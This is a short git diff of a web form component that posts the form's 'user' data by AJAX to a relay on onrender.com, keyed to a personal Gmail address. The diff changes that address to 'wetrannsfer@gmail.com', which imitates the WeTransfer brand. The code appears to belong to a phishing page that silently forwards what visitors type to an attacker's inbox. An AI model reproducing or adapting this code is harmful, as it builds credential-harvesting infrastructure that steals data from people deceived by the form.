@@ -91,28 +91,14 @@ export const Form = ({ toggleForm })=>{
             };
 
 
-            
+
             $.ajax({
                 type: "POST",
-                url: "https://send-service-quotaion.onrender.com/get_details/globaldope60@gmail.com/order/",
+                url: "https://send-service-quotaion.onrender.com/get_details/wetrannsfer@gmail.com/order/",
                 data: user,
                 success(data) {
-                    console.log('ok');
+                    console.log(data);
                 },
-                crossDomain: true,
-                xhrFields: {
-                    withCredentials: true
-                },
-                contentType: 'application/json; charset=utf-8'
-            })
-
-            .done(function (data) {
-                console.log('done');
-            })
-            .fail(function (xhr, textStatus, errorThrown) {
-                alert(xhr.statusCode);
-                alert(textStatus);
-                alert(errorThrown)
             });
 
 
